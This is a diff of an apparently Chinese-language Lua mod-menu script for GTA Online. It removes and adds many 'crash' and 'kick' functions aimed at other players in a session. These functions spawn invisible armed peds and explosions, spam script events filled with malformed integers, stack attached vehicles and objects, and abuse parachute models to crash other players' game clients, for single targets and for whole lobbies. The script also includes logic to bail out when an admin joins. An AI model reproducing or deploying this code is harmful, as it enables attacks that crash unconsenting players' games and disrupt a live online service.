-        util.yield(10000)
-        entities.delete_by_handle(PED4)
-    end
-    if players.exists(PlayerID) then
-        notification("未能移除玩家,正在使用cs_taostranslator2模型",colors.black)
-        local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
-        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
-        util.yield(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
-        util.yield(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        util.yield(10000)
-        entities.delete_by_handle(PED5)
-    end
-    if players.exists(PlayerID) then
-        notification("未能移除玩家,正在使用cs_tenniscoach模型",colors.black)
-        local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
-        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
-        util.yield(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
-        util.yield(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        util.yield(10000)
-        entities.delete_by_handle(PED6)
-    end
-    if players.exists(PlayerID) then
-        notification("未能移除玩家,正在使用cs_wade模型",colors.black)
-        local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
-        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
-        util.yield(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
-        util.yield(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        util.yield(10000)
-        entities.delete_by_handle(PED7)
-    end
-    if not players.exists(PlayerID) then
-        notification("成功移除玩家",colors.black)
-    end
-end)
-menu.toggle_loop(caidanbk,"回弹崩溃", {"reboundcrash"}, "Working.", function()
+    collapse2 = menu.list(player_removals, "组合崩溃(2)", {}, "夜幕全新组合崩溃")
+    menu.action(collapse2, "灯火阑珊", {"denghuolanshan"}, "", function()
+    notification( "请等待5-10秒崩溃进程", colors.black)
     if PlayerID ~= players.user() then
-        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-        local pos = players.get_position(PlayerID)
-        local mdl = util.joaat("mp_m_freemode_01")
-        local veh_mdl = util.joaat("taxi")
+    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
+    local mdl = util.joaat("cs_taostranslator2")
+    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
+    local pos = players.get_position(PlayerID)
+    local mdl = util.joaat("mp_m_freemode_01")
+    local veh_mdl = util.joaat("taxi")
         util.request_model(veh_mdl)
         util.request_model(mdl)
             for i = 1, 10 do
@@ -3317,179 +1674,144 @@ menu.toggle_loop(caidanbk,"回弹崩溃", {"reboundcrash"}, "Working.", function
                 local veh = entities.create_vehicle(veh_mdl, pos, 0)
                 local jesus = entities.create_ped(2, mdl, pos, 0)
                 PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
-                util.yield(100)
+                wait(100)
                 TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
-                util.yield(1000)
+                wait(1000)
                 entities.delete_by_handle(jesus)
                 entities.delete_by_handle(veh)
             end  
         STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
         STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
-    util.toast("发送给 " .. players.get_name(PlayerID))
-    util.log("发送给 " .. players.get_name(PlayerID))
     end
-end)
-menu.toggle_loop(caidanbk,"樱桃崩溃", {"cheraxcrash"}, "Working.", function()
-    if PlayerID ~= players.user() then
-    menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(PlayerID))
-    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(PlayerID))
-    menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(PlayerID))
-    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(PlayerID))
-    util.yield()
-    util.toast("发送到 " .. players.get_name(PlayerID))
-    util.log("发送到 " .. players.get_name(PlayerID))
+    while not STREAMING.HAS_MODEL_LOADED(mdl) do
+        STREAMING.REQUEST_MODEL(mdl)
+        wait(5)
     end
-end)
-menu.toggle_loop(caidanbk,"北域崩溃", {"northcrash"}, "Working.", function()
-    if PlayerID ~= players.user() then
-    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
-    local michael = util.joaat("player_zero")
-    while not STREAMING.HAS_MODEL_LOADED(michael) do
-        STREAMING.REQUEST_MODEL(michael)
-        util.yield()
+    local ped = {}
+    for i = 1, 10 do 
+        local coord = ENTITY.GET_ENTITY_COORDS(player, true)
+        local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
+        ped[i] = entities.create_ped(0, mdl, coord, 0)
+        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
+        WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
+        ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
+        wait(25)
     end
-    local ped = entities.create_ped(0, michael, pos, 0)
-    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
-    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 7, 0)
-    util.yield()
-    ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, true, false, false, true)
-    util.yield(500)
-    entities.delete_by_handle(ped)
-    util.toast("发送到 " .. players.get_name(PlayerID))
-    util.log("发送到 " .. players.get_name(PlayerID))
+    wait(2500)
+    for i = 1, 10 do
+        entities.delete_by_handle(ped[i])
+        wait(25)
     end
-end)
-menu.toggle_loop(caidanbk,"黄昏崩溃", {"nightfallcrash"}, "Not coded Yet.", function()
-    if PlayerID ~= players.user() then
-    util.toast("发送到 " .. players.get_name(PlayerID))
-    util.log("发送到 " .. players.get_name(PlayerID))
-    end
-end)
-menu.toggle_loop(caidanbk,"Kiddions崩溃", {"kiddionscrash"}, "Working. LMFAO", function()
-    if PlayerID ~= players.user() then
-    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(PlayerID))
-    util.yield()
-    util.toast("发送给 " .. players.get_name(PlayerID))
-    util.log("发送给 " .. players.get_name(PlayerID))
-    end
-end)
-    menu.action(wanjiabengkui, "kuku崩", {"kukucrash"}, "崩溃玩家", function()
-    YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'kuku.png')
-if SCRIPT_MANUAL_START then
-    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
-    logo_alpha = 0
-    logo_alpha_incr = 0.01
-    logo_alpha_thread = util.create_thread(function (thr)
-        while true do
-            logo_alpha = logo_alpha + logo_alpha_incr
-            if logo_alpha > 1 then
-                logo_alpha = 1
-            elseif logo_alpha < 0 then
-                logo_alpha = 0
-                util.stop_thread()
-            end
-            util.yield()
-        end
+     notification( "灯火阑珊---崩溃结束", colors.black)
     end)
-
-    logo_thread = util.create_thread(function (thr)
-        starttime = os.clock()
-        local alpha = 0
-        while true do
-            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
-            timepassed = os.clock() - starttime
-            if timepassed > 3 then
-                logo_alpha_incr = -0.01
-            end
-            if logo_alpha == 0 then
-                util.stop_thread()
-            end
-            util.yield()
-        end
+    menu.action(collapse2, "华灯初上", {"huadengchushang"}, "", function()
+    notification( "请等待5-10秒崩溃进程", colors.black)
+    menu.trigger_commands("choke".. PLAYER.GET_PLAYER_NAME(PlayerID))
+    local getPlayerPed = PLAYER.GET_PLAYER_PED
+    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
+    local cord = getEntityCoords(getPlayerPed(PlayerID))
+    local object = entities.create_object(util.joaat("virgo"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("osiris"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_firealarm"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_bs_cond"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_bs_foamx3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_ct_monitor07"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_ct_monitor06"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_ct_monitor05"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_bs_gelx3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_ct_monitor01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("feltzer3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_ct_monitor02"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("windsor"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_ct_monitor04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_ct_monitor03"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    local object = entities.create_object(util.joaat("v_serv_bs_clutter"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
+    pedp = players.user_ped(PlayerID)
+    pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
+    towtruck = CreateVehicle(-1323100960, pos, 0)
+    skylift = CreateVehicle(-692292317, pos, 0)
+    cargobob = CreateVehicle(4244420235, pos, 0)
+    cargobob2 = CreateVehicle(4244420235, pos, 0)
+    cargobob1 = CreateVehicle(4244420235, pos, 0)
+    handler = CreateVehicle(444583674, pos, 0)
+    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob, skylift, 0, 0, 0, 0.2, 0, 0, 0, false, true, false, 0, true)
+    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob1, skylift, 0, 0, 0, -0.2, 0, 0, 0, false, true, false, 0, true)
+    ENTITY.ATTACH_ENTITY_TO_ENTITY(handler, skylift, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
+    ENTITY.ATTACH_ENTITY_TO_ENTITY(towtruck, skylift, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
+    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob2, towtruck, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
+    ENTITY.ATTACH_ENTITY_TO_ENTITY(skylift, pedp, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
+    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
+    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
+    ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
+    ENTITY.SET_ENTITY_VELOCITY(object, math.random(-10, 10), math.random(-10, 10), math.random(30, 50))
+    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, object, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
+    wait(300)
+    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("weapon_heavysniper_mk2"), players.user_ped(), false, true, 1.0)
+    ENTITY.DETACH_ENTITY(object, object)
+    entities.delete_by_handle(object)
+    dibai5()
+     notification( "华灯初上---崩溃结束", colors.black)
     end)
-end
-        local int_min = -2147483647
-        local int_max = 2147483647
-        for i = 1, 20 do
-            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
-            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-            math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
-        end
-        for i = 1, 20 do
-            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, PlayerID, math.random(int_min, int_max)})
-            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
-            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
-        end
-        for i = 1, 15 do
-            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, PlayerID, math.random(int_min, int_max)})
-            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
-        end
-        util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
-        for i = 1, 15 do
-            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
-            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-            math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
-        end
-        menu.trigger_commands("givesh" .. players.get_name(PlayerID))
-        util.yield(200)
-        for i = 1, 200 do
-            util.trigger_script_event(1 << PlayerID, {548471420, 16, 804923209, -303901118, 577104152, 653299499, -1218005427, -1010050857, 1831797592, 1508078618, 9, -700037855, -1565442250, 932677838})
-        end
-    end)
-function BadOutfitCrashV1(PlayerID)
-menu.trigger_commands("anticrashcam on")
-    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-    local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
-    local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    for i = 0, 500 do
-        PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
-        ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
-        util.yield(10)
+    menu.action(collapse2, '午夜魅影', {"wuyemeiying"}, "", function ()
+    notification( "请等待5-10秒崩溃进程", colors.black)
+    player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
+    veh = entities.get_all_vehicles_as_handles()
+    for i = 1, #veh do
+    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
+    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], 0, 0, 5)
+    TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 18, 777)
+    TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 17, 888)
+    TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 16, 999)
     end
-    entities.delete_by_handle(Spawned_Mike)
-    menu.trigger_commands("anticrashcam off")
-end
-menu.action(wanjiabengkui, "GZS崩溃", {}, "GZScrash", function()
-          YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'GZS.png')
-        if SCRIPT_MANUAL_START then
-    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
-    logo_alpha = 0
-    logo_alpha_incr = 0.01
-    logo_alpha_thread = util.create_thread(function (thr)
-        while true do
-            logo_alpha = logo_alpha + logo_alpha_incr
-            if logo_alpha > 1 then
-                logo_alpha = 1
-            elseif logo_alpha < 0 then
-                logo_alpha = 0
-                util.stop_thread()
-            end
-            util.yield()
-        end
+    ped_task = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
+    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.GET_PLAYER_PED(PlayerID), true)
+    entities.create_object(0x9cf21e0f , ped_task, true, false) 
+    local Rui_task = CreateVehicle(util.joaat("Ruiner2"), ped_task, ENTITY.GET_ENTITY_HEADING(TTPed), true)
+    local ped_task2 = CreatePed(26 , util.joaat("ig_kaylee"), ped_task, 0)
+    for i=0, 10 do
+    local pedps = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
+    local allpeds = entities.get_all_peds_as_handles()
+    local allvehicles = entities.get_all_vehicles_as_handles()
+    local allobjects = entities.get_all_objects_as_handles()
+    local ownped = players.user_ped(players.user())
+    request_model(0x78BC1A3C)
+    request_model(0x000B75B9)
+    request_model(0x15F27762)
+    request_model(0x0E512E79)
+    CreateVehicle(0xD6BC7523,pedps,0)
+    CreateVehicle(0x1F3D44B5,pedps,0)
+    CreateVehicle(0x2A72BEAB,pedps,0)
+    CreateVehicle(0x174CB172,pedps,0)
+    CreateVehicle(0x78BC1A3C,pedps,0)
+    CreateVehicle(0x0E512E79,pedps,0)
+    for i = 1, #allpeds do
+    if allpeds[i] ~= ownped then
+    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allpeds[i], 0, 0, 0)
+    end
+    end
+    for i = 1, #allvehicles do
+    if allvehicles[i] ~= ownvehicle then
+    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allvehicles[i], 0, 0, 0)
+    VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(allvehicles[i], 0, 0, 0)
+    VEHICLE.SET_TAXI_LIGHTS(allvehicles[i])
+    end
+    end
+    for i = 1, #allobjects do
+    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allobjects[i], 0, 0, 0)
+    end
+    wait()
+    end
+    PED.RESURRECT_PED(players.user_ped(PlayerID))
+    wait(2000)
+    entities.delete_by_handle(Rui_task)
+    entities.delete_by_handle(ped_task2)
+     notification( "午夜魅影---崩溃结束", colors.black)
     end)
-
-    logo_thread = util.create_thread(function (thr)
-        starttime = os.clock()
-        local alpha = 0
-        while true do
-            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
-            timepassed = os.clock() - starttime
-            if timepassed > 3 then
-                logo_alpha_incr = -0.01
-            end
-            if logo_alpha == 0 then
-                util.stop_thread()
-            end
-            util.yield()
-        end
+    menu.action(collapse2, "夜幕笼罩", {"yemulongzhao"}, "", function()
+           menu.trigger_commands("denghuolanshan " .. players.get_name(PlayerID))
+           menu.trigger_commands("huadengchushang " .. players.get_name(PlayerID))
+           menu.trigger_commands("wuyemeiying " .. players.get_name(PlayerID))
     end)
-end
-    BadOutfitCrashV1(PlayerID)
-     notification("崩溃结束.")
-end)
 
 if bailOnAdminJoin then
         if players.is_marked_as_admin(PlayerID) and not players.user() then
@@ -3499,9 +1821,10 @@ if bailOnAdminJoin then
         end
  end
 end
-
+-------------------脚本单体选项------------------------
 players.on_join(player)
 players.dispatch_on_join()
+-----------------------结尾-----------------------------
 
 quanjubengkui = menu.list(quanju,"全局踢出/崩溃", {},"崩溃全局~")
 menu.divider(quanjubengkui, "全局踢出")
@@ -3685,69 +2008,6 @@ menu.divider(quanjubengkui, "全局崩溃")
         ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
         notification( "崩溃完成", green)
     end)
-    menu.action(quanjubengkui, "载具伞崩全局", {}, "崩溃全局", function ()
-        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
-        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
-        for i = 1, 20 do
-            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
-            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
-            PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
-            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
-            util.yield(200)
-            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_05"))
-            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
-            util.yield(200)
-            entities.delete_by_handle(Ruiner2)
-        end
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
-        notification( "崩溃完成", green)
-    end)
-    menu.click_slider(quanjubengkui,"仿西普肉伞崩", {""}, "1=null伞 2=车伞", 1, 2, 1, 1, function(on_change)
-            if on_change == 1 then	
-        notification("崩溃开始" ,colors.black)
-        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(TPP, true)
-        local SelfPlayerPed = CreatePed(26, util.joaat("player_one"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))  
-for i = 0 , -1 do 
-local SelfPlayerPed = CreatePed(26, util.joaat("player_one"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))      
-ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
-util.yield()
-end
-for i = 1, 30 do                     
-ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
-local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
-PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
-ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
-util.yield(200)
-VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_08"))
-VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
-util.yield(200)
-entities.delete_by_handle(Ruiner2)
-end        
-    notification("崩溃结束" ,colors.black)
-end
-
-if on_change == 2 then
-        notification("崩溃执行开始" ,colors.black)
-        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
-        local SelfPlayerPed = entities.create_ped(2, util.joaat("u_m_m_jesus_01"), SelfPlayerPos, 0)
-        for i = 1, 30 do                   
-            ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
-            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
-            PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
-            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
-            util.yield(300)
-            notification("崩溃执行中" ,colors.black)
-VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_08"))
-VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
-            util.yield(300)
-            entities.delete_by_handle(Ruiner2)
-            entities.delete_by_handle(SelfPlayerPed)
-        end
-        notification("崩溃执行结束" ,colors.black)
-end
-
-end)
  
     menu.action(quanjubengkui,"人物伞崩全局V2",{},"崩溃全局",function()
        wudihh()
@@ -4089,6 +2349,8 @@ menu.action(quanjubengkui, "同步崩溃", {}, "", function(state)
     end
     end)
 menu.action(quanjubengkui, "改进数学崩溃", {"math2"}, "", function()
+    local getPlayerPed = PLAYER.GET_PLAYER_PED
+    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
     local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
     local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
     pos.x = pos.x+5
@@ -4124,145 +2386,6 @@ menu.action(quanjubengkui, "改进数学崩溃", {"math2"}, "", function()
     PHYSICS.DELETE_CHILD_ROPE(rope)
     PHYSICS.ROPE_UNLOAD_TEXTURES()
 end)
-    menu.action(quanjubengkui, "核弹崩溃", {""}, "", function()
